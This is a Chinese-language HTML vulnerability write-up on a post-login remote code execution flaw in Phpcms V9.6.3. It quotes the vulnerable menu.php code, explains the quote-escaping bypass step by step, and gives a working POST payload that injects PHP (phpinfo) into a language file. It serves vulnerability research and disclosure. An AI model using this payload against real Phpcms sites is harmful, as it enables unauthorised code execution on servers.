<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpcms-v963-后台远程命令执行漏洞"><span class="csDE05BCC">Phpcms V9.6.3 </span><span class="csECDA2D3">后台远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms V9.6.3</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞代码位于</span><span class="cs8926E06"> </span><span class="cs9FB05234">/phpcms/modules/admin/menu.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第</span><span class="cs8926E06"> 81 </span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">function edit() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(isset($_POST[&#39;dosubmit&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$id = intval($_POST[&#39;id&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//print_r($_POST[&#39;info&#39;]);exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;update($_POST[&#39;info&#39;],array(&#39;id&#39;=&gt;$id));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">修改语言文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$file = PC_PATH.&#39;languages&#39;.DIRECTORY_SEPARATOR.&#39;zh-cn&#39;.DIRECTORY_SEPARATOR.&#39;system_menu.lang.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require $file;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$key = $_POST[&#39;info&#39;][&#39;name&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!isset($LANG[$key])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = file_get_contents($file);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = substr($content,0,-2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($file,$data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif(isset($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[&#39;language&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = file_get_contents($file);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_replace($LANG[$key],$_POST[&#39;language&#39;],$content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($file,$content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;update_menu_models($id, $r, $_POST[&#39;info&#39;]); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">结束语言文件修改</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(L(&#39;operation_success&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;. &nbsp;. &nbsp;. &nbsp;&nbsp;. &nbsp;. &nbsp;. &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这段代码是修改语言文件用的，而这个语言文件就是</span><span class="cs8926E06"> /phpcms/languages/zh-cn/system_menu.lang.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">里面一堆类似</span><span class="cs8926E06"> </span><span class="cs9FB05234">$LANG[&#39;video&#39;] = &#39;</span><span class="cs7FFD2630">视频</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的东西</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当时用</span><span class="cs8926E06"> rips </span><span class="cs9C1B1871">扫描发现的大多是</span><span class="cs8926E06"> </span><span class="cs9FB05234">$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这种拼接操作，而且</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">中的单引号会被转义，无法逃逸</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">转义代码位于</span><span class="cs8926E06"> </span><span class="cs9FB05234">/phpcms/libs/classes/param.class.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function __construct() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!get_magic_quotes_gpc()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_POST = new_addslashes($_POST);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_GET = new_addslashes($_GET);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_REQUEST = new_addslashes($_REQUEST);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_COOKIE = new_addslashes($_COOKIE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而这里突然看到一个</span><span class="cs8926E06"> str_replace </span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9FB05234">str_replace($LANG[$key],$_POST[&#39;language&#39;],$content)</span><span class="cs9C1B1871">，感觉可能会有漏洞</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一番胡乱测试之后惊奇的发现网站</span><span class="cs8926E06"> 500 </span><span class="cs9C1B1871">了，细看原来是单引号逃逸导致报错</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下面是漏洞分析过程</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先要登录后台拿到</span><span class="cs8926E06"> pc_hash </span><span class="cs9C1B1871">的值，这个是防止提交恶意数据的，后台首页</span><span class="cs8926E06"> F12 </span><span class="cs9C1B1871">就能看到</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.3%20%e5%90%8e%e5%8f%b0%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="251" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后访问：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w</span></p><p class="cs40DD2BC9"><span class="cs8926E06">phpcms </span><span class="cs9C1B1871">的路由和那个</span><span class="cs8926E06"> yzmcms </span><span class="cs9C1B1871">差不多，</span><span class="cs8926E06">m </span><span class="cs9C1B1871">是模块名，对应</span><span class="cs8926E06"> /phpcms </span><span class="cs9C1B1871">下的文件夹，</span><span class="cs8926E06">c </span><span class="cs9C1B1871">是控制器名，对应</span><span class="cs8926E06"> /phpcms/</span><span class="cs9C1B1871">模块</span><span class="cs8926E06">/ </span><span class="cs9C1B1871">下的</span><span class="cs8926E06"> php </span><span class="cs9C1B1871">文件名，</span><span class="cs8926E06">a </span><span class="cs9C1B1871">则对应控制器类的类函数名</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">dosubmit=1&amp;info[name]=1&amp;language=1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">语言文件最后会新添内容</span></p><p class="cs3A447A38"><span class="cs9FB05234">$LANG[&#39;1&#39;] = &#39;1&#39;;</span></p><h3 class="cs868C439D">
			<a name="第一次请求"><span class="csD6CA00D2">第一次请求</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">发送</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">dosubmit=1&amp;info[name]=1&amp;language=1&#39;</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">require $file;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">引入语言文件，</span><span class="cs9FB05234">$LANG[$key]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值还是</span><span class="cs8926E06"> NULL</span><span class="cs9C1B1871">，所以执行拼接操作</span></p><p class="cs3A447A38"><span class="cs9FB05234">$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">file_put_contents($file,$data);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">得到语言文件新添内容为</span></p><p class="cs3A447A38"><span class="cs9FB05234">$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
			<a name="第二次请求"><span class="csD6CA00D2">第二次请求</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">发送与第一次相同的</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">require $file;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">引入语言文件得到</span><span class="cs8926E06"> </span><span class="cs9FB05234">$LANG[$key]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值是</span><span class="cs8926E06"> </span><span class="cs9FB05234">string(2) &quot;1&#39;&quot;</span><span class="cs9C1B1871">，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新</span><span class="cs8926E06"> </span><span class="cs9FB05234">$LANG[$key]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的值的</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是因为</span><span class="cs8926E06"> </span><span class="cs9FB05234">require</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs9FB05234">file_get_contents</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数读取之后的文件内容不含反斜杠，而我们</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">传入的</span><span class="cs8926E06"> language </span><span class="cs9C1B1871">会被转义处理得到的值是</span><span class="cs8926E06"> </span><span class="cs9FB05234">string(3) &quot;1\&#39;&quot;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是判断</span><span class="cs8926E06"> </span><span class="cs9FB05234">$LANG[$key]!=$_POST[&#39;language&#39;]</span><span class="cs8926E06"> </span><span class="cs9C1B1871">就成立了，接着</span><span class="cs8926E06"> </span><span class="cs9FB05234">str_replace</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数进行字符串替换操作，把原来的</span><span class="cs8926E06"> </span><span class="cs9FB05234">$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中的</span><span class="cs8926E06"> </span><span class="cs9FB05234">1&#39;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">替换成</span><span class="cs8926E06"> </span><span class="cs9FB05234">1\&#39;</span><span class="cs9C1B1871">，最终写入文件</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">结果就得到了以下文件内容，第二个单引号被反斜杠转义，无法闭合</span></p><p class="cs3A447A38"><span class="cs9FB05234">$LANG[&#39;1\&#39;] = &#39;1\&#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">payload:</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送两次以下请求，访问语言文件</span><span class="cs8926E06"> http://www.0-sec.org:9000/phpcms/languages/zh-cn/system_menu.lang.php </span><span class="cs9C1B1871">即可得到</span><span class="cs8926E06"> phpinfo</span></p><p class="cs40DD2BC9"><span class="cs8926E06">URL:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w</span></p><p class="cs40DD2BC9"><span class="cs8926E06">POST:</span></p><p class="cs3A447A38"><span class="cs9FB05234">dosubmit=1&amp;info[name]=];phpinfo();//1&amp;language=];phpinfo();//1&#39;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.3%20%e5%90%8e%e5%8f%b0%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="381" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">http://j0k3r.top/2019/10/09/phpcmsv9.6.3_background_rce/</span></p></body>
</html>
